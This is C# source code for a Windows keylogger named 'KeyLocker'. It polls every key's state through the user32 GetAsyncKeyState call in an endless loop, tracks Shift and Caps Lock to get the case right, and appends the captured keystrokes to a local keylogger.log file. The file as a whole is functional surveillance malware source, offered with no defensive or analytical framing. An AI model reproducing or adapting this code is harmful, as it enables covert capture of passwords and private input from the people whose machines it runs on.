using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLocker
{
    static class Program
    {
        private static string buf;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [STAThread]
        static void Main(String[] args)
        {
            
            while (true)
            {
                
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(i);
                    // Keys.ShiftKey не работает, поэтому я подставил его числовой эквивалент
                    if ((shiftState & i) == i)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;
                    bool isBig = shift | caps;
                    
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                                buf += ((Keys)i).ToString().ToLowerInvariant();

                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }

            }
        }
    }
}
